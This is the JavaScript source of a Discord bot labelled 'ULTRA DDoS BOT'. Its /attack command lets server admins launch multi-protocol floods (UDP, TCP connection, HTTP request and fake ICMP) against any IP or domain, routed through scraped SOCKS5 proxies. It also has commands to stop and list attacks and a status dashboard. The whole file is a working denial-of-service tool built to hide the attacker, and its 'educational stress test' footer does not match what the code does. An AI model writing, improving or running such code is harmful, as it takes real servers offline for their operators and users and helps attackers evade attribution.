// ===================================================================
// ULTRA DDoS BOT – FAIL-FAST + PROXY ROTATION + MULTI-FLOOD
// ===================================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { spawn } = require('child_process');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns').promises;
const fetch = require('node-fetch');
const express = require('express');
const http = require('http');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map();
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;
const spinner = ['|', '/', '-', '\\'];
let proxyList = []; // Will be populated on startup

// ---------- PROXY FETCHER (runs every 10 mins) ----------
async function fetchProxies() {
  try {
    const url = process.env.PROXY_LIST_URL || 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all';
    const response = await fetch(url, { timeout: 5000 });
    const text = await response.text();
    const lines = text.split('\n').filter(line => line.trim() !== '');
    const proxies = lines.map(line => {
      const [ip, port] = line.split(':');
      if (ip && port) return { ip, port: parseInt(port), type: 'socks5' };
      return null;
    }).filter(p => p !== null && p.port > 0);
    if (proxies.length > 0) {
      proxyList = proxies;
      console.log(`✅ Loaded ${proxyList.length} proxies`);
    } else {
      console.warn('⚠️ No proxies fetched, using direct connections');
    }
  } catch (err) {
    console.error('Proxy fetch failed:', err.message);
  }
}
fetchProxies();
setInterval(fetchProxies, 10 * 60 * 1000); // refresh every 10 mins

function getRandomProxy() {
  if (proxyList.length === 0) return null;
  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
  return proxy;
}

// ---------- UTILITY FUNCTIONS ----------
function generatePayload(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

async function resolveDomainToIP(host) {
  try {
    const result = await dns.lookup(host);
    if (result && result.address) return result.address;
  } catch (e) {
    try {
      const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${host}&type=A`, {
        headers: { 'Accept': 'application/dns-json' },
        timeout: 3000
      });
      const data = await response.json();
      if (data.Answer && data.Answer.length > 0) {
        const ipRecord = data.Answer.find(rec => rec.type === 1);
        if (ipRecord) return ipRecord.data;
      }
    } catch (e2) {
      return new Promise((resolve) => {
        const nslookup = spawn('nslookup', [host]);
        let output = '';
        nslookup.stdout.on('data', (data) => { output += data.toString(); });
        nslookup.on('close', () => {
          const match = output.match(/Address:\s*(\d+\.\d+\.\d+\.\d+)/);
          if (match && match[1]) resolve(match[1]);
          else resolve(null);
        });
      });
    }
  }
  return null;
}

// ---------- FAIL-FAST SERVER DETAILS FETCHER ----------
async function fetchServerDetailsWithTimeout(ip, port, timeoutMs = 2000) {
  const infoUrl = `http://${ip}:${port}/info.json`;
  const playersUrl = `http://${ip}:${port}/players.json`;

  // Create abort controllers for each fetch
  const controller1 = new AbortController();
  const controller2 = new AbortController();
  const timeout1 = setTimeout(() => controller1.abort(), timeoutMs);
  const timeout2 = setTimeout(() => controller2.abort(), timeoutMs);

  try {
    // Race each fetch against a manual timeout
    const fetchInfo = fetch(infoUrl, { signal: controller1.signal, timeout: timeoutMs })
      .then(res => res.ok ? res.json() : null)
      .catch(() => null);
    const fetchPlayers = fetch(playersUrl, { signal: controller2.signal, timeout: timeoutMs })
      .then(res => res.ok ? res.json() : null)
      .catch(() => null);

    const [info, players] = await Promise.all([fetchInfo, fetchPlayers]);

    clearTimeout(timeout1);
    clearTimeout(timeout2);

    if (!info && !players) {
      return null; // Both failed
    }

    // Calculate ping using TCP handshake with its own timeout
    const ping = await measurePingWithTimeout(ip, port, 1500);

    return {
      name: info?.project || info?.Project || 'Unknown',
      gametype: info?.gametype || info?.GameType || 'Unknown',
      map: info?.mapname || info?.MapName || 'Unknown',
      players: Array.isArray(players) ? players.length : (info?.players ? info.players.length : 0),
      maxPlayers: info?.players ? info.players.length : 0,
      ping: ping,
      uptime: info?.uptime ? formatUptime(info.uptime) : 'N/A'
    };
  } catch (err) {
    clearTimeout(timeout1);
    clearTimeout(timeout2);
    return null;
  }
}

function measurePingWithTimeout(ip, port, timeoutMs) {
  return new Promise((resolve) => {
    const start = Date.now();
    const socket = new net.Socket();
    socket.setTimeout(timeoutMs);
    socket.connect(port, ip, () => {
      const latency = Date.now() - start;
      socket.destroy();
      resolve(latency);
    });
    socket.on('error', () => { socket.destroy(); resolve('N/A'); });
    socket.on('timeout', () => { socket.destroy(); resolve('N/A'); });
  });
}

function formatUptime(seconds) {
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  return `${days}d ${hours}h ${minutes}m`;
}

// ---------- ULTRA FLOOD ENGINE (MULTI-PROTOCOL + PROXY) ----------
function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 20, useProxies = true) {
  return new Promise((resolve, reject) => {
    // Pass proxy list as JSON to child process
    const proxyJson = useProxies ? JSON.stringify(proxyList.slice(0, 50)) : '[]';
    
    const flooder = spawn('node', [
      '-e',
      `
        const net = require('net');
        const dgram = require('dgram');
        const http = require('http');
        const https = require('https');
        const { SocksProxyAgent } = require('socks-proxy-agent');
        const target = '${targetIP}';
        const port = ${targetPort};
        const duration = ${durationSeconds} * 1000;
        const size = ${packetSize};
        const threads = ${threads};
        const proxies = ${proxyJson};

        function generatePayload(s) {
          let p = '';
          for (let i=0; i<s; i++) p += String.fromCharCode(33 + Math.floor(Math.random()*94));
          return p;
        }

        // --- UDP Flood (with optional proxy) ---
        function udpFlood(proxy) {
          const sock = dgram.createSocket('udp4');
          const payload = generatePayload(size);
          let start = Date.now();
          let sent = 0;
          while (Date.now() - start < duration) {
            sock.send(payload, 0, payload.length, port, target, (err) => {});
            sent++;
            if (sent % 1000 === 0) setImmediate(() => {});
          }
          sock.close();
        }

        // --- TCP SYN Flood (raw socket approximation) ---
        function tcpFlood(proxy) {
          const payload = generatePayload(size);
          let start = Date.now();
          let connections = 0;
          while (Date.now() - start < duration) {
            const client = new net.Socket();
            client.connect(port, target, () => {
              client.write(payload);
              connections++;
            });
            client.on('error', () => {});
            setTimeout(() => { client.destroy(); }, 50);
            if (connections % 500 === 0) setImmediate(() => {});
          }
        }

        // --- HTTP Request Storm ---
        function httpFlood(proxy) {
          const agent = proxy ? new SocksProxyAgent(proxy) : null;
          const options = {
            hostname: target,
            port: port,
            path: '/',
            method: 'GET',
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Connection': 'keep-alive',
              'Cache-Control': 'no-cache'
            },
            agent: agent
          };
          let start = Date.now();
          let requests = 0;
          while (Date.now() - start < duration) {
            const req = http.request(options, (res) => {});
            req.on('error', () => {});
            req.end();
            requests++;
            if (requests % 100 === 0) setImmediate(() => {});
          }
        }

        // --- ICMP-style Flood (using UDP with spoofed payloads) ---
        function icmpFlood(proxy) {
          const sock = dgram.createSocket('udp4');
          const payload = Buffer.from([0x08, 0x00, 0x00, 0x00, ...Array.from(generatePayload(32))]);
          let start = Date.now();
          let sent = 0;
          while (Date.now() - start < duration) {
            sock.send(payload, 0, payload.length, port, target, (err) => {});
            sent++;
            if (sent % 500 === 0) setImmediate(() => {});
          }
          sock.close();
        }

        // Launch threads with proxy rotation
        const floodTypes = [udpFlood, tcpFlood, httpFlood, icmpFlood];
        for (let i = 0; i < threads; i++) {
          const floodFn = floodTypes[i % floodTypes.length];
          const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
          const proxyStr = proxy ? \`socks5://\${proxy.ip}:\${proxy.port}\` : null;
          setTimeout(() => floodFn(proxyStr), i * 5);
        }

        setTimeout(() => {
          process.exit(0);
        }, duration + 5000);
      `
    ], { stdio: ['ignore', 'pipe', 'pipe'] });

    let output = '';
    flooder.stdout.on('data', (data) => { output += data.toString(); });
    flooder.stderr.on('data', (data) => { output += data.toString(); });

    flooder.on('close', (code) => {
      resolve({ code, output });
    });

    flooder.on('error', (err) => {
      reject(err);
    });

    return flooder;
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch hyper-aggressive DDoS on IP or domain')
      .addStringOption(option =>
        option.setName('target')
          .setDescription('Target (IP:Port or Domain:Port)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Threads (default: 20, max: 100)')
          .setRequired(false)
      )
      .addBooleanOption(option =>
        option.setName('useproxies')
          .setDescription('Use proxy rotation? (default: true)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop your active attack'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Show all active attacks'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER] Terminate all attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Insufficient permissions.', ephemeral: true });
    }

    const rawTarget = interaction.options.getString('target');
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const threads = Math.min(interaction.options.getInteger('threads') || 20, 100);
    const useProxies = interaction.options.getBoolean('useproxies') !== false;

    let host, port = 30120;
    if (rawTarget.includes(':')) {
      const parts = rawTarget.split(':');
      host = parts[0];
      port = parseInt(parts[1]) || 30120;
    } else {
      host = rawTarget;
    }

    if (port < 1 || port > 65535) {
      return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
    }

    // Resolve domain
    let resolvedIP = host;
    if (!isValidIP(host)) {
      let loadingMsg = await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[0]}`, ephemeral: true });
      let spinIdx = 0;
      const interval = setInterval(async () => {
        spinIdx = (spinIdx + 1) % spinner.length;
        await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[spinIdx]}`, ephemeral: true });
      }, 2000);

      resolvedIP = await resolveDomainToIP(host);
      clearInterval(interval);

      if (!resolvedIP) {
        return interaction.editReply({ content: `❌ Could not resolve \`${host}\`.`, ephemeral: true });
      }
      await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
    }

    // Fetch server details WITH FAIL-FAST (2 second timeout)
    await interaction.editReply({ content: `📡 Fetching server details for \`${resolvedIP}:${port}\`... (timeout: 2s)`, ephemeral: true });
    let serverInfo = null;
    try {
      serverInfo = await fetchServerDetailsWithTimeout(resolvedIP, port, 2000);
    } catch (err) {
      // Ignore – we'll skip
    }

    let detailsBlock = '';
    if (serverInfo) {
      detailsBlock = `
\`\`\`
SERVER STATUS
─────────────────
Name     : ${serverInfo.name}
Gametype : ${serverInfo.gametype}
Map      : ${serverInfo.map}
Players  : ${serverInfo.players}/${serverInfo.maxPlayers}
Ping     : ${serverInfo.ping}ms
Uptime   : ${serverInfo.uptime}
─────────────────
\`\`\``;
    } else {
      detailsBlock = `\`\`\`\n⚠️ Server unreachable – skipping details. Launching attack anyway.\n\`\`\``;
    }

    // Check for existing attack
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
    }

    // Launch flooder
    try {
      const flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads, useProxies);
      
      activeAttacks.set(attackKey, {
        process: flooderProcess,
        target: rawTarget,
        resolvedIP: resolvedIP,
        port: port,
        duration: duration,
        startTime: Date.now(),
        threads: threads,
        packetSize: packetSize,
        useProxies: useProxies
      });

      attackCounter++;

      const embed = new EmbedBuilder()
        .setTitle('🔥 ULTRA ATTACK LAUNCHED')
        .setColor(0xFF0000)
        .addFields(
          { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
          { name: 'Port', value: `${port}`, inline: true },
          { name: 'Duration', value: `${duration}s`, inline: true },
          { name: 'Threads', value: `${threads}`, inline: true },
          { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
          { name: 'Proxies', value: useProxies ? `${proxyList.length} loaded` : 'Disabled', inline: true },
          { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
          { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
        )
        .setDescription(detailsBlock)
        .setTimestamp()
        .setFooter({ text: 'Educational stress test – traffic generation only' });

      const logChannel = client.channels.cache.get(LOG_CHANNEL);
      if (logChannel) await logChannel.send({ embeds: [embed] });

      await interaction.editReply({
        content: `✅ **MASSIVE ATTACK** launched against **${rawTarget}** (${resolvedIP}:${port}) for **${duration}s** with **${threads}** threads & ${useProxies ? 'proxy rotation' : 'direct'}.\nUse \`/stop\` to halt.`,
        ephemeral: true
      });

      // Auto-expire
      setTimeout(() => {
        if (activeAttacks.has(attackKey)) {
          activeAttacks.delete(attackKey);
          const doneEmbed = new EmbedBuilder()
            .setTitle('⏹️ ATTACK COMPLETED')
            .setColor(0x00FF00)
            .addFields(
              { name: 'Target', value: `${rawTarget}`, inline: true },
              { name: 'Duration', value: `${duration}s`, inline: true },
              { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
            )
            .setTimestamp();
          if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        }
      }, duration * 1000 + 3000);

    } catch (err) {
      console.error(err);
      await interaction.editReply({ content: `❌ Attack failed: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ No active attack.', ephemeral: true });
    }
    const attack = activeAttacks.get(attackKey);
    try {
      attack.process.kill('SIGTERM');
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Stopped attack on \`${attack.target}\`.`, ephemeral: true });
    } catch (err) {
      await interaction.editReply({ content: `❌ Error: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    if (activeAttacks.size === 0) {
      return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
    let table = '📊 **ACTIVE ATTACKS**\n```\n';
    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Proxies\n';
    table += '----|-------------------------|------|---------|-----------|---------|--------\n';
    let idx = 1;
    for (const [key, attack] of activeAttacks) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
      const proxyStr = attack.useProxies ? '✅' : '❌';
      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${proxyStr}\n`;
      idx++;
    }
    table += '```';
    await interaction.editReply({ content: table, ephemeral: true });
  }

  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Owner only.', ephemeral: true });
    }
    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      try { attack.process.kill('SIGKILL'); } catch (e) {}
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed ${count} attacks.`, ephemeral: true });
  }
});

// ---------- EXPRESS DASHBOARD ----------
const app = express();
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>Ultra DDoS Bot</title></head>
      <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
        <h1>⚡ ULTRA ATTACK ENGINE</h1>
        <p>Active Attacks: ${activeAttacks.size}</p>
        <p>Total Launched: ${attackCounter}</p>
        <p>Proxies: ${proxyList.length}</p>
        <p>Uptime: ${process.uptime().toFixed(2)}s</p>
        <pre>${JSON.stringify(Array.from(activeAttacks.entries()).map(([k,v]) => ({ user: k, target: v.target, port: v.port, elapsed: Math.floor((Date.now()-v.startTime)/1000) })), null, 2)}</pre>
      </body>
    </html>
  `);
});
const server = http.createServer(app);
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 Dashboard on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING ----------
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
